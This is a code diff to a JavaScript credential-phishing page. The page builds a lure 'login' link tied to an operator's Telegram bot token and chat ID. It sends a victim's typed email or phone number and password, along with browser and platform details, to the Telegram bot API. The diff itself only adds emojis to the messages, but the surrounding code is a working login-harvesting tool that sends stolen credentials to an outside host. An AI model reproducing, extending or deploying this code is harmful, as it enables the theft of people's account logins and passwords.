@@ -117,8 +117,8 @@
         var chatId = document.getElementById('chatId').value;
         var loginUrl = window.location.href + "?botToken=" + botToken + "&chatId=" + chatId + "#login";
 
-        // Updated message with two channels
-        var message = `Login here: ${loginUrl}\nOwner: @sasumon007\nJoin my channels:\n@SA\\_Tech\\_Tutorial\n@SA\\_Tech\\_Tips`;
+        // Updated message with emojis and two channels
+        var message = `🔗 Login here: ${loginUrl}\n👤 Owner: @sasumon007\n📢 Join my channels:\n@SA\\_Tech\\_Tutorial\n@SA\\_Tech\_Tips`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -141,9 +141,9 @@
 
     // Function to get device information
     function getDeviceInfo() {
-        var deviceInfo = `Device Info:\n`;
-        deviceInfo += `Browser: ${navigator.userAgent}\n`;
-        deviceInfo += `Platform: ${navigator.platform}\n`;
+        var deviceInfo = `📱 Device Info:\n`;
+        deviceInfo += `🌐 Browser: ${navigator.userAgent}\n`;
+        deviceInfo += `💻 Platform: ${navigator.platform}\n`;
         return deviceInfo;
     }
 
@@ -182,7 +182,7 @@
             },
             body: JSON.stringify({
                 chat_id: window.chatId,
-                text: `Login info:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}\n${deviceInfo}`
+                text: `🔐 Login Info:\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}\n${deviceInfo}`
             })
         }).then(response => response.json())
           .then(data => {
